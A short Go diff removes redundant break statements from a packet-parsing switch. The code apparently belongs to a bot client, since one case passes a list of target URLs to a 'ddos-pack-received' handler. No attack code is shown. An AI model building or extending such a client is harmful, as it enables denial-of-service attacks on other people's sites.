@@ -101,7 +101,6 @@ func (this *ClientModule) ParseData(socketBuf []byte) {
 		}
 
 		this.emitter.Emit("hello-pack-received", "")
-		break
 	case constants.ADMIN_TYPE_HELLO:
 		this.version = this.receiveBuf[2]
 
@@ -115,7 +114,6 @@ func (this *ClientModule) ParseData(socketBuf []byte) {
 		}
 
 		this.emitter.Emit("hello-pack-received", "")
-		break
 	case constants.ADMIN_TYPE_REPLY:
 		break
 
@@ -129,7 +127,6 @@ func (this *ClientModule) ParseData(socketBuf []byte) {
 		}
 
 		this.emitter.Emit("ddos-pack-received", urls)
-		break
 
 	default:
 		this.emitter.Emit("error", fmt.Sprintf("Failed to get/parse type_is (%d)", packetType))
